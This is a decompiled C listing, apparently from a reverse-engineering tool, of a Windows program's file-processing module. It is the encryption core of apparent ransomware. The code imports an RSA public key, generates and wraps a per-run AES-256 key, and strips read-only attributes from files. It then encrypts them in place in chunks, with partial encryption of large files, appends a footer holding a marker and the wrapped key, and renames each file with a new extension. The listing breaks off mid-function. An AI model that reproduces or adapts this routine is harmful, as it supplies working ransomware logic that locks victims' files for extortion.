int __thiscall sub_413310(int this, int a2, volatile signed __int32 *a3)
{
  char v4; // al
  int v6[2]; // [esp+14h] [ebp-4Ch] BYREF
  int v7; // [esp+1Ch] [ebp-44h]
  int v8; // [esp+20h] [ebp-40h]
  char v9; // [esp+27h] [ebp-39h]
  int v10[2]; // [esp+28h] [ebp-38h] BYREF
  char v11; // [esp+30h] [ebp-30h]
  int v12; // [esp+34h] [ebp-2Ch]
  int *v13; // [esp+4Ch] [ebp-14h]
  int v14; // [esp+5Ch] [ebp-4h]

  v8 = this;
  v14 = 0;
  if ( a3 )
    _InterlockedIncrement(a3 + 1);
  sub_40F700((_DWORD *)this, a2, a3, 6);
  *(_DWORD *)this = &ANFileProcessModule::`vftable';
  *(_BYTE *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 48) = 0;
  *(_DWORD *)(this + 52) = 15;
  *(_BYTE *)(this + 32) = 0;
  v4 = v9;
  *(_DWORD *)(this + 56) = 0;
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 0;
  *(_DWORD *)(this + 68) = 0;
  *(_DWORD *)(this + 72) = 16974599;
  v11 = v4;
  *(_DWORD *)(this + 80) = 0;
  *(_DWORD *)(this + 84) = 0;
  *(_DWORD *)(this + 88) = 0;
  v10[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v10[1] = (int)sub_413600;
  v12 = this;
  v13 = v10;
  LOBYTE(v14) = 3;
  sub_40FA20((int *)this, 32, (int)v10);
  v6[0] = (int)sub_4137E0;
  v7 = this;
  sub_414530(v10, (int)v6);
  sub_40FA20((int *)this, 33, (int)v10);
  v6[0] = (int)sub_413A30;
  v7 = this;
  sub_414530(v10, (int)v6);
  sub_40FA20((int *)this, 6, (int)v10);
  if ( v13 )
    (*(void (__stdcall **)(bool))(*v13 + 16))(v13 != v10);
  if ( a3 )
  {
    if ( !_InterlockedExchangeAdd(a3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))a3)(a3);
      if ( !_InterlockedDecrement(a3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*a3 + 4))(a3);
    }
  }
  return this;
}
// 4B15B4: using guessed type void *ANFileProcessModule::`vftable';
// 4B15D0: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (004134B0) --------------------------------------------------------
_DWORD *__thiscall sub_4134B0(_DWORD *Block, char a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  *Block = &ANFileProcessModule::`vftable';
  sub_413A60((int)Block);
  v3 = Block[13];
  if ( v3 >= 0x10 )
  {
    v4 = (_DWORD *)Block[8];
    if ( v3 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_44775B(v4);
  }
  Block[12] = 0;
  Block[13] = 15;
  *((_BYTE *)Block + 32) = 0;
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B15B4: using guessed type void *ANFileProcessModule::`vftable';

//----- (00413530) --------------------------------------------------------
int __thiscall sub_413530(int *this)
{
  int result; // eax
  int v3[2]; // [esp+8h] [ebp-48h] BYREF
  int *v4; // [esp+10h] [ebp-40h]
  char v5; // [esp+17h] [ebp-39h]
  int v6[2]; // [esp+18h] [ebp-38h] BYREF
  char v7; // [esp+20h] [ebp-30h]
  int *v8; // [esp+24h] [ebp-2Ch]
  int *v9; // [esp+3Ch] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-4h]

  v7 = v5;
  v6[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v6[1] = (int)sub_413600;
  v8 = this;
  v9 = v6;
  v10 = 0;
  sub_40FA20(this, 32, (int)v6);
  v3[0] = (int)sub_4137E0;
  v4 = this;
  sub_414530(v6, (int)v3);
  sub_40FA20(this, 33, (int)v6);
  v3[0] = (int)sub_413A30;
  v4 = this;
  sub_414530(v6, (int)v3);
  result = sub_40FA20(this, 6, (int)v6);
  if ( v9 )
    return (*(int (__stdcall **)(bool))(*v9 + 16))(v9 != v6);
  return result;
}
// 4B15D0: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00413600) --------------------------------------------------------
int __thiscall sub_413600(int this, void *a2)
{
  int result; // eax
  int v4; // esi
  const CHAR *v5; // edi
  bool v6; // cf
  const CHAR *v7; // eax
  DWORD v8; // esi
  HANDLE ProcessHeap; // eax
  void *v10; // esi
  HANDLE v11; // eax
  HANDLE v12; // eax
  int v13; // [esp+8h] [ebp-Ch]
  DWORD pcbBinary; // [esp+Ch] [ebp-8h] BYREF

  result = sub_414590(a2);
  v4 = result;
  v13 = result;
  if ( *(_BYTE *)(this + 24) )
  {
    *(_BYTE *)(result + 40) = 1;
    return result;
  }
  if ( *(_DWORD *)(result + 32)
    && (*(_DWORD *)(this + 84)
     || CryptAcquireContextW(
          (HCRYPTPROV *)(this + 84),
          0,
          L"Microsoft Enhanced Cryptographic Provider v1.0",
          1u,
          0xF0000000)
     || GetLastError() == -2146893802
     && CryptAcquireContextW((HCRYPTPROV *)(this + 84), 0, L"Microsoft Enhanced Cryptographic Provider v1.0", 1u, 8u))
    && (*(_DWORD *)(this + 28)
     || CryptAcquireContextW((HCRYPTPROV *)(this + 28), 0, 0, 0x18u, 0)
     || GetLastError() == -2146893802 && CryptAcquireContextW((HCRYPTPROV *)(this + 28), 0, 0, 0x18u, 8u)) )
  {
    v5 = (const CHAR *)(v4 + 16);
    if ( *(_DWORD *)(v4 + 32) )
    {
      v6 = *(_DWORD *)(v4 + 36) < 0x10u;
      v7 = (const CHAR *)(v4 + 16);
      pcbBinary = 0;
      if ( !v6 )
        v7 = *(const CHAR **)v5;
      if ( CryptStringToBinaryA(v7, 0, 1u, 0, &pcbBinary, 0, 0) )
      {
        v8 = pcbBinary;
        ProcessHeap = GetProcessHeap();
        v10 = HeapAlloc(ProcessHeap, 0, v8);
        if ( v10 )
        {
          if ( *((_DWORD *)v5 + 5) >= 0x10u )
            v5 = *(const CHAR **)v5;
          if ( CryptStringToBinaryA(v5, 0, 1u, (BYTE *)v10, &pcbBinary, 0, 0)
            && CryptImportKey(*(_DWORD *)(this + 84), (const BYTE *)v10, pcbBinary, 0, 0, (HCRYPTKEY *)(this + 80)) )
          {
            v11 = GetProcessHeap();
            HeapFree(v11, 0, v10);
            if ( sub_413F50((HCRYPTPROV *)this) )
            {
              result = v13;
              *(_BYTE *)(this + 24) = 1;
              *(_BYTE *)(v13 + 40) = 1;
              return result;
            }
          }
          else
          {
            v12 = GetProcessHeap();
            HeapFree(v12, 0, v10);
          }
        }
      }
    }
  }
  return sub_413A60(this);
}

//----- (004137E0) --------------------------------------------------------
char __thiscall sub_4137E0(int this, void *a2)
{
  int v3; // eax
  int v4; // edi
  const WCHAR *v5; // esi
  const WCHAR *v6; // eax
  DWORD v7; // eax
  const WCHAR *v8; // ecx
  const WCHAR *v9; // eax
  HANDLE FileW; // eax
  const WCHAR *v11; // eax
  BOOL v12; // eax
  unsigned int v13; // edx
  WCHAR *v14; // ecx
  HANDLE hObject; // [esp+10h] [ebp-80h]
  int v17[4]; // [esp+14h] [ebp-7Ch] BYREF
  int v18[6]; // [esp+24h] [ebp-6Ch] BYREF
  int v19[4]; // [esp+3Ch] [ebp-54h] BYREF
  int v20[6]; // [esp+4Ch] [ebp-44h] BYREF
  LPCWSTR lpNewFileName[5]; // [esp+64h] [ebp-2Ch] BYREF
  unsigned int v22; // [esp+78h] [ebp-18h]
  HCRYPTKEY phKey; // [esp+7Ch] [ebp-14h] BYREF
  int v24; // [esp+8Ch] [ebp-4h]

  v3 = sub_414610(a2);
  v4 = v3;
  if ( *(_BYTE *)(this + 24) )
  {
    if ( *(_DWORD *)(v3 + 32)
      && *(_DWORD *)(v3 + 40)
      && (v5 = (const WCHAR *)(v3 + 16), LOBYTE(v3) = sub_413AC0(this, (LPCWSTR)(v3 + 16)), !(_BYTE)v3) )
    {
      v17[1] = 0;
      v17[2] = 4;
      v17[3] = 31;
      v24 = 0;
      v17[0] = (int)&ANEventSmartScan::`vftable';
      sub_4055B0(v18, (_DWORD *)(v4 + 16));
      v24 = 1;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)this + 4))(this, v17);
      phKey = 0;
      if ( CryptDuplicateKey(*(_DWORD *)(this + 88), 0, 0, &phKey) )
      {
        v6 = (const WCHAR *)(v4 + 16);
        if ( *(_DWORD *)(v4 + 36) >= 8u )
          v6 = *(const WCHAR **)v5;
        v7 = GetFileAttributesW(v6) & 0xFFFFFFFE;
        v8 = (const WCHAR *)(v4 + 16);
        if ( *(_DWORD *)(v4 + 36) >= 8u )
          v8 = *(const WCHAR **)v5;
        SetFileAttributesW(v8, v7);
        v9 = (const WCHAR *)(v4 + 16);
        if ( *(_DWORD *)(v4 + 36) >= 8u )
          v9 = *(const WCHAR **)v5;
        FileW = CreateFileW(v9, 0xC0000000, 0, 0, 3u, 0x80u, 0);
        hObject = FileW;
        if ( FileW != (HANDLE)-1 )
        {
          if ( sub_413BB0((_DWORD *)this, phKey, FileW, *(_DWORD *)(v4 + 40)) )
          {
            CloseHandle(hObject);
            v19[1] = 0;
            v19[2] = 2;
            v19[3] = 11;
            v19[0] = (int)&ANEventGetExtension::`vftable';
            v20[4] = 0;
            v20[5] = 7;
            LOWORD(v20[0]) = 0;
            LOBYTE(v24) = 2;
            (*(void (__thiscall **)(int, int *))(*(_DWORD *)this + 4))(this, v19);
            sub_412520(lpNewFileName, (_DWORD *)(v4 + 16), (unsigned int *)v20);
            v11 = (const WCHAR *)lpNewFileName;
            if ( v22 >= 8 )
              v11 = lpNewFileName[0];
            if ( *(_DWORD *)(v4 + 36) >= 8u )
              v5 = *(const WCHAR **)v5;
            v12 = MoveFileExW(v5, v11, 1u);
            v13 = v22;
            *(_BYTE *)(v4 + 44) = v12;
            if ( v13 >= 8 )
            {
              v14 = (WCHAR *)lpNewFileName[0];
              if ( 2 * v13 + 2 >= 0x1000 )
              {
                v14 = (WCHAR *)*((_DWORD *)lpNewFileName[0] - 1);
                if ( (unsigned int)((char *)lpNewFileName[0] - (char *)v14 - 4) > 0x1F )
                  _invalid_parameter_noinfo_noreturn();
              }
              sub_44775B(v14);
            }
            lpNewFileName[4] = 0;
            v22 = 7;
            LOWORD(lpNewFileName[0]) = 0;
            sub_4131D0(v19);
          }
          else
          {
            CloseHandle(hObject);
          }
        }
        CryptDestroyKey(phKey);
      }
      LOBYTE(v3) = sub_413270(v17);
    }
    else
    {
      *(_BYTE *)(v4 + 44) = 0;
    }
  }
  return v3;
}
// 4B15A4: using guessed type void *ANEventGetExtension::`vftable';
// 4B15C8: using guessed type void *ANEventSmartScan::`vftable';
// 4137E0: using guessed type int var_6C[6];

//----- (00413A30) --------------------------------------------------------
void **__thiscall sub_413A30(void **this, void *a2)
{
  void **v2; // esi
  void **result; // eax
  size_t v4; // ecx

  v2 = this + 8;
  result = (void **)(sub_414690(a2) + 16);
  if ( result != v2 )
  {
    v4 = (size_t)v2[4];
    if ( (unsigned int)v2[5] >= 0x10 )
      v2 = (void **)*v2;
    return sub_40A390(result, v2, v4);
  }
  return result;
}

//----- (00413A60) --------------------------------------------------------
HCRYPTPROV __thiscall sub_413A60(int this)
{
  HCRYPTPROV v2; // eax
  HCRYPTPROV result; // eax

  if ( *(_DWORD *)(this + 88) )
  {
    CryptDestroyKey(*(_DWORD *)(this + 88));
    *(_DWORD *)(this + 88) = 0;
  }
  if ( *(_DWORD *)(this + 80) )
  {
    CryptDestroyKey(*(_DWORD *)(this + 80));
    *(_DWORD *)(this + 80) = 0;
  }
  v2 = *(_DWORD *)(this + 84);
  if ( v2 )
  {
    CryptReleaseContext(v2, 0);
    *(_DWORD *)(this + 84) = 0;
  }
  result = *(_DWORD *)(this + 28);
  if ( result )
  {
    result = CryptReleaseContext(result, 0);
    *(_DWORD *)(this + 28) = 0;
  }
  *(_BYTE *)(this + 24) = 0;
  return result;
}

//----- (00413AC0) --------------------------------------------------------
bool __thiscall sub_413AC0(int this, LPCWSTR lpFileName)
{
  const WCHAR *v2; // eax
  bool v3; // bl
  HANDLE FileW; // esi
  DWORD NumberOfBytesRead[2]; // [esp+10h] [ebp-18h] BYREF
  LARGE_INTEGER NewFilePointer; // [esp+18h] [ebp-10h] BYREF

  v2 = lpFileName;
  v3 = 0;
  if ( *((_DWORD *)lpFileName + 4) )
  {
    if ( *((_DWORD *)lpFileName + 5) >= 8u )
      v2 = *(const WCHAR **)lpFileName;
    FileW = CreateFileW(v2, 0x80000000, 0, 0, 3u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      *(_QWORD *)NumberOfBytesRead = 0i64;
      NewFilePointer.QuadPart = 0i64;
      *(_OWORD *)(this + 56) = 0i64;
      *(_QWORD *)(this + 72) = 0i64;
      if ( SetFilePointerEx(FileW, (LARGE_INTEGER)-24i64, &NewFilePointer, 2u) )
      {
        NumberOfBytesRead[0] = 0;
        if ( ReadFile(FileW, (LPVOID)(this + 56), 0x18u, NumberOfBytesRead, 0) )
        {
          if ( NumberOfBytesRead[0] == 24 && *(_DWORD *)(this + 72) == 16974599 )
            v3 = *(_DWORD *)(this + 64) == 512;
        }
      }
      CloseHandle(FileW);
    }
  }
  return v3;
}

//----- (00413BB0) --------------------------------------------------------
char __thiscall sub_413BB0(_DWORD *this, HCRYPTKEY hKey, HANDLE hFile, int a4)
{
  DWORD v4; // ebx
  BOOL (__stdcall *v5)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED); // esi
  LPVOID *v6; // eax
  DWORD i; // esi
  LPVOID *v8; // eax
  BYTE **v9; // ecx
  BYTE *v10; // eax
  BYTE **v11; // eax
  DWORD v12; // kr00_4
  LARGE_INTEGER v13; // kr08_8
  _DWORD *v14; // eax
  int v15; // ecx
  char v16; // bl
  void *v17; // ecx
  BYTE *v18; // ecx
  DWORD v21; // [esp+14h] [ebp-88h]
  LARGE_INTEGER Buffer; // [esp+18h] [ebp-84h] BYREF
  int v23; // [esp+20h] [ebp-7Ch]
  int v24; // [esp+24h] [ebp-78h]
  int v25; // [esp+28h] [ebp-74h]
  BYTE *pbData[5]; // [esp+30h] [ebp-6Ch] BYREF
  unsigned int v27; // [esp+44h] [ebp-58h]
  LPVOID lpBuffer[4]; // [esp+48h] [ebp-54h] BYREF
  int v29; // [esp+58h] [ebp-44h]
  unsigned int v30; // [esp+5Ch] [ebp-40h]
  LARGE_INTEGER liDistanceToMove; // [esp+60h] [ebp-3Ch] BYREF
  LARGE_INTEGER NewFilePointer; // [esp+68h] [ebp-34h] BYREF
  LARGE_INTEGER FileSize; // [esp+70h] [ebp-2Ch] BYREF
  DWORD NumberOfBytesRead; // [esp+78h] [ebp-24h] BYREF
  DWORD v35[2]; // [esp+7Ch] [ebp-20h] BYREF
  DWORD pdwDataLen; // [esp+84h] [ebp-18h] BYREF
  DWORD NumberOfBytesWritten[5]; // [esp+88h] [ebp-14h] BYREF

  if ( hKey )
  {
    if ( hFile != (HANDLE)-1 )
    {
      pdwDataLen = 0x2000;
      if ( CryptEncrypt(hKey, 0, 0, 0, 0, &pdwDataLen, 0) )
      {
        v4 = pdwDataLen;
        if ( pdwDataLen >= 0x2000 )
        {
          FileSize.QuadPart = 0i64;
          if ( GetFileSizeEx(hFile, &FileSize) )
          {
            NumberOfBytesRead = 0;
            NumberOfBytesWritten[0] = 0;
            pbData[4] = 0;
            v27 = 15;
            LOBYTE(pbData[0]) = 0;
            sub_40A250((void **)pbData, v4, 0);
            NumberOfBytesWritten[4] = 0;
            v29 = 0;
            v30 = 15;
            LOBYTE(lpBuffer[0]) = 0;
            sub_40A250(lpBuffer, 0x100000u, 0);
            v5 = WriteFile;
            NewFilePointer.QuadPart = 0i64;
            *(_QWORD *)v35 = 0i64;
            if ( FileSize.QuadPart <= 0 )
            {
LABEL_28:
              *(_QWORD *)v35 = 0i64;
              NewFilePointer.QuadPart = 0i64;
              liDistanceToMove.QuadPart = 0i64;
              if ( SetFilePointerEx(hFile, 0i64, &NewFilePointer, 2u) )
              {
                v14 = this + 8;
                if ( this[13] >= 0x10u )
                  v14 = (_DWORD *)*v14;
                if ( v5(hFile, v14, this[12], NumberOfBytesWritten, 0) )
                {
                  v15 = this[12];
                  if ( NumberOfBytesWritten[0] == v15 )
                  {
                    Buffer = FileSize;
                    v24 = a4;
                    v23 = v15;
                    v25 = 16974599;
                    if ( v5(hFile, &Buffer, 0x18u, NumberOfBytesWritten, 0) )
                    {
                      if ( NumberOfBytesWritten[0] == 24 )
                      {
                        v16 = 1;
                        goto LABEL_37;
                      }
                    }
                  }
                }
              }
            }
            else
            {
              v21 = v35[1];
              pdwDataLen = v35[0];
              while ( 1 )
              {
                liDistanceToMove.QuadPart = 0i64;
                if ( !SetFilePointerEx(hFile, 0i64, &NewFilePointer, 1u) )
                  break;
                v6 = lpBuffer;
                if ( v30 >= 0x10 )
                  v6 = (LPVOID *)lpBuffer[0];
                if ( !ReadFile(hFile, v6, 0x100000u, &NumberOfBytesRead, 0)
                  || !SetFilePointerEx(hFile, NewFilePointer, &liDistanceToMove, 0) )
                {
                  break;
                }
                for ( i = 0; i < NumberOfBytesRead; i += 0x2000 )
                {
                  v8 = lpBuffer;
                  v9 = pbData;
                  if ( v30 >= 0x10 )
                    v8 = (LPVOID *)lpBuffer[0];
                  if ( v27 >= 0x10 )
                    v9 = (BYTE **)pbData[0];
                  memmove(v9, &v8[i / 4], 0x2000u);
                  v35[1] = 0x2000;
                  v10 = (BYTE *)pbData;
                  if ( v27 >= 0x10 )
                    v10 = pbData[0];
                  if ( !CryptEncrypt(hKey, 0, 0, 0, v10, &v35[1], v4) )
                    goto LABEL_36;
                  v11 = pbData;
                  if ( v27 >= 0x10 )
                    v11 = (BYTE **)pbData[0];
                  if ( !WriteFile(hFile, v11, v4, NumberOfBytesWritten, 0) )
                    goto LABEL_36;
                }
                if ( a4 != 1 )
                {
                  v12 = pdwDataLen;
                  pdwDataLen += 0x100000;
                  v13.QuadPart = __PAIR64__(v21, v12) + 0x100000;
                  v21 = (__PAIR64__(v21, v12) + 0x100000) >> 32;
                  if ( v13.QuadPart < FileSize.QuadPart )
                    continue;
                }
                v5 = WriteFile;
                goto LABEL_28;
              }
            }
LABEL_36:
            v16 = 0;
LABEL_37:
            if ( v30 >= 0x10 )
            {
              v17 = lpBuffer[0];
              if ( v30 + 1 >= 0x1000 )
              {
                v17 = (void *)*((_DWORD *)lpBuffer[0] - 1);
                if ( (unsigned int)(lpBuffer[0] - v17 - 4) > 0x1F )
                  goto LABEL_47;
              }
              sub_44775B(v17);
            }
            v29 = 0;
            v30 = 15;
            LOBYTE(lpBuffer[0]) = 0;
            if ( v27 < 0x10 )
              return v16;
            v18 = pbData[0];
            if ( v27 + 1 < 0x1000
              || (v18 = (BYTE *)*((_DWORD *)pbData[0] - 1), (unsigned int)(pbData[0] - v18 - 4) <= 0x1F) )
            {
              sub_44775B(v18);
              return v16;
            }
LABEL_47:
            _invalid_parameter_noinfo_noreturn();
          }
        }
      }
    }
  }
  return 0;
}

//----- (00413F50) --------------------------------------------------------
char __thiscall sub_413F50(HCRYPTPROV *this)
{
  HCRYPTKEY *v2; // ebx
  BOOL v3; // eax
  DWORD v4; // edi
  BOOL v5; // eax
  DWORD v6; // ebx
  BYTE *v7; // eax
  BYTE *v8; // eax
  BOOL v9; // eax
  DWORD v10; // edi
  BYTE *v11; // eax
  void *v12; // ecx
  BYTE *v13; // ecx
  BYTE *v14; // ecx
  BYTE *v16; // ecx
  BYTE *v17; // ecx
  HCRYPTKEY v18; // [esp-1Ch] [ebp-B4h]
  HCRYPTKEY v19; // [esp-1Ch] [ebp-B4h]
  HCRYPTKEY v20; // [esp-1Ch] [ebp-B4h]
  HCRYPTKEY v21; // [esp-18h] [ebp-B0h]
  void *Block[5]; // [esp+10h] [ebp-88h] BYREF
  unsigned int v23; // [esp+24h] [ebp-74h]
  int v24[4]; // [esp+28h] [ebp-70h] BYREF
  WCHAR WideCharStr[8]; // [esp+38h] [ebp-60h] BYREF
  int v26; // [esp+48h] [ebp-50h]
  int v27; // [esp+4Ch] [ebp-4Ch]
  BYTE *pbData[4]; // [esp+50h] [ebp-48h] BYREF
  int v29; // [esp+60h] [ebp-38h]
  unsigned int v30; // [esp+64h] [ebp-34h]
  BYTE *v31[4]; // [esp+68h] [ebp-30h] BYREF
  DWORD v32; // [esp+78h] [ebp-20h]
  unsigned int v33; // [esp+7Ch] [ebp-1Ch]
  DWORD pdwDataLen; // [esp+80h] [ebp-18h] BYREF
  DWORD v35; // [esp+84h] [ebp-14h] BYREF
  int v36; // [esp+94h] [ebp-4h]

  v2 = this + 22;
  v35 = 0;
  if ( CryptGenKey(this[7], 0x6610u, 1u, this + 22) )
  {
    pdwDataLen = 0;
    v3 = CryptExportKey(*v2, 0, 8u, 0, 0, &pdwDataLen);
    v18 = this[20];
    pdwDataLen &= -v3;
    v4 = pdwDataLen;
    v5 = CryptEncrypt(v18, 0, 1, 0, 0, &pdwDataLen, 0);
    v6 = v5 ? pdwDataLen : 0;
    if ( v4 )
    {
      if ( v6 )
      {
        v29 = 0;
        v30 = 15;
        LOBYTE(pbData[0]) = 0;
        sub_40A250((void **)pbData, v5 ? pdwDataLen : 0, 0);
        v36 = 0;
        v7 = (BYTE *)pbData;
        if ( v30 >= 0x10 )
          v7 = pbData[0];
        v21 = this[22];
        v35 = v4;
        if ( CryptExportKey(v21, 0, 8u, 0, v7, &v35) )
        {
          v8 = (BYTE *)pbData;
          if ( v30 >= 0x10 )
            v8 = pbData[0];
          v19 = this[20];
          v35 = v4;
          if ( CryptEncrypt(v19, 0, 1, 0, v8, &v35, v6) )
          {
            v24[1] = 0;
            v24[2] = 2;
            v24[3] = 11;
            v24[0] = (int)&ANEventGetExtension::`vftable';
            v26 = 0;
            v27 = 7;
            WideCharStr[0] = 0;
            LOBYTE(v36) = 1;
            (*(void (__thiscall **)(HCRYPTPROV *, int *))(*this + 4))(this, v24);
            sub_405EF0(v31, WideCharStr);
            LOBYTE(v36) = 2;
            v35 = v32;
            v20 = this[20];
            pdwDataLen = v4;
            v9 = CryptEncrypt(v20, 0, 1, 0, 0, &pdwDataLen, 0);
            v10 = v9 ? pdwDataLen : 0;
            if ( v35 && v10 )
            {
              sub_40E9F0(v31, v9 ? pdwDataLen : 0, 0);
              v11 = (BYTE *)v31;
              if ( v33 >= 0x10 )
                v11 = v31[0];
              if ( CryptEncrypt(this[20], 0, 1, 0, v11, &v35, v10) )
              {
                LOBYTE(v36) = 3;
                Block[4] = 0;
                v23 = 15;
                LOBYTE(Block[0]) = 0;
                v35 = 1;
                sub_414300(Block, __CFADD__(v32, v29) ? -1 : v32 + v29);
                sub_409C70(Block, pbData);
                sub_409C70(Block, v31);
                sub_414430(this + 8, Block);
                if ( v23 >= 0x10 )
                {
                  v12 = Block[0];
                  if ( v23 + 1 >= 0x1000 )
                  {
                    v12 = (void *)*((_DWORD *)Block[0] - 1);
                    if ( (unsigned int)(Block[0] - v12 - 4) > 0x1F )
                      _invalid_parameter_noinfo_noreturn();
                  }
                  sub_44775B(v12);
                }
                if ( v33 >= 0x10 )
                {
                  v13 = v31[0];
                  if ( v33 + 1 >= 0x1000 )
                  {
                    v13 = (BYTE *)*((_DWORD *)v31[0] - 1);
                    if ( (unsigned int)(v31[0] - v13 - 4) > 0x1F )
                      goto LABEL_39;
                  }
                  sub_44775B(v13);
                }
                v32 = 0;
                v33 = 15;
                LOBYTE(v31[0]) = 0;
                sub_4131D0(v24);
                if ( v30 < 0x10 )
                  return 1;
                v14 = pbData[0];
                if ( v30 + 1 < 0x1000
                  || (v14 = (BYTE *)*((_DWORD *)pbData[0] - 1), (unsigned int)(pbData[0] - v14 - 4) <= 0x1F) )
                {
                  sub_44775B(v14);
                  return 1;
                }
LABEL_39:
                _invalid_parameter_noinfo_noreturn();
              }
            }
            if ( v33 >= 0x10 )
            {
              v16 = v31[0];
              if ( v33 + 1 >= 0x1000 )
              {
                v16 = (BYTE *)*((_DWORD *)v31[0] - 1);
                if ( (unsigned int)(v31[0] - v16 - 4) > 0x1F )
                  goto LABEL_39;
              }
              sub_44775B(v16);
            }
            v32 = 0;
            v33 = 15;
            LOBYTE(v31[0]) = 0;
            sub_4131D0(v24);
          }
        }
        if ( v30 >= 0x10 )
        {
          v17 = pbData[0];
          if ( v30 + 1 >= 0x1000 )
          {
            v17 = (BYTE *)*((_DWORD *)pbData[0] - 1);
            if ( (unsigned int)(pbData[0] - v17 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          sub_44775B(v17);
        }
      }
    }
  }
  return 0;
}
// 4B15A4: using guessed type void *ANEventGetExtension::`vftable';
// 413F50: using guessed type WCHAR WideCharStr[8];

//----- (00414300) --------------------------------------------------------
void __thiscall sub_414300(void **Src, unsigned int a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // esi
  unsigned int v5; // ecx
  void *v6; // eax
  _DWORD *v7; // ebx
  void *v8; // esi
  size_t v9; // [esp-4h] [ebp-18h]
  unsigned int v10; // [esp+Ch] [ebp-8h]
  void *v11; // [esp+10h] [ebp-4h]

  v3 = (unsigned int)Src[5];
  v10 = v3;
  if ( v3 < a2 )
  {
    v11 = Src[4];
    if ( 0x7FFFFFFF - (int)v11 < a2 - (unsigned int)v11 )
      sub_404900();
    v4 = a2 | 0xF;
    if ( (a2 | 0xF) <= 0x7FFFFFFF )
    {
      if ( v3 <= 0x7FFFFFFF - (v3 >> 1) )
      {
        if ( v4 < v3 + (v3 >> 1) )
          v4 = v3 + (v3 >> 1);
      }
      else
      {
        v4 = 0x7FFFFFFF;
      }
    }
    else
    {
      v4 = 0x7FFFFFFF;
    }
    v5 = __CFADD__(v4, 1) ? -1 : v4 + 1;
    if ( v5 < 0x1000 )
    {
      if ( v5 )
        v7 = operator new(__CFADD__(v4, 1) ? -1 : v4 + 1);
      else
        v7 = 0;
    }
    else
    {
      if ( v5 + 35 <= v5 )
        sub_403CC0();
      v6 = operator new(v5 + 35);
      if ( !v6 )
        goto LABEL_25;
      v7 = (_DWORD *)(((unsigned int)v6 + 35) & 0xFFFFFFE0);
      *(v7 - 1) = v6;
    }
    Src[4] = (void *)a2;
    Src[5] = (void *)v4;
    v9 = (size_t)v11 + 1;
    if ( v10 >= 0x10 )
    {
      v8 = *Src;
      memmove(v7, *Src, v9);
      if ( v10 + 1 < 0x1000 )
      {
LABEL_20:
        sub_44775B(v8);
        *Src = v7;
        Src[4] = v11;
        return;
      }
      if ( (unsigned int)v8 - *((_DWORD *)v8 - 1) - 4 <= 0x1F )
      {
        v8 = (void *)*((_DWORD *)v8 - 1);
        goto LABEL_20;
      }
LABEL_25:
      _invalid_parameter_noinfo_noreturn();
    }
    memmove(v7, Src, v9);
    *Src = v7;
    Src[4] = v11;
  }
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00414430) --------------------------------------------------------
_DWORD *__thiscall sub_414430(_DWORD *this, _QWORD *a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  if ( this != (_DWORD *)a2 )
  {
    v3 = this[5];
    if ( v3 >= 0x10 )
    {
      v4 = (_DWORD *)*this;
      if ( v3 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v4 = (_DWORD *)*(v4 - 1);
      }
      sub_44775B(v4);
    }
    this[4] = 0;
    this[5] = 15;
    *(_BYTE *)this = 0;
    *(_OWORD *)this = *(_OWORD *)a2;
    *((_QWORD *)this + 2) = a2[2];
    *((_DWORD *)a2 + 4) = 0;
    *((_DWORD *)a2 + 5) = 15;
    *(_BYTE *)a2 = 0;
  }
  return this;
}

//----- (004144B0) --------------------------------------------------------
void __thiscall sub_4144B0(_DWORD *this, int a2, int a3)
{
  unsigned int v4; // ecx
  _DWORD *v5; // eax

  v4 = this[5];
  if ( v4 >= 0x10 )
  {
    v5 = (_DWORD *)*this;
    if ( v4 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
  *(_OWORD *)this = *(_OWORD *)a2;
  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
}

//----- (00414530) --------------------------------------------------------
void *__thiscall sub_414530(void *this, int a2)
{
  int v4[2]; // [esp+8h] [ebp-28h] BYREF
  char v5; // [esp+10h] [ebp-20h]
  int v6; // [esp+14h] [ebp-1Ch]
  int *v7; // [esp+2Ch] [ebp-4h]

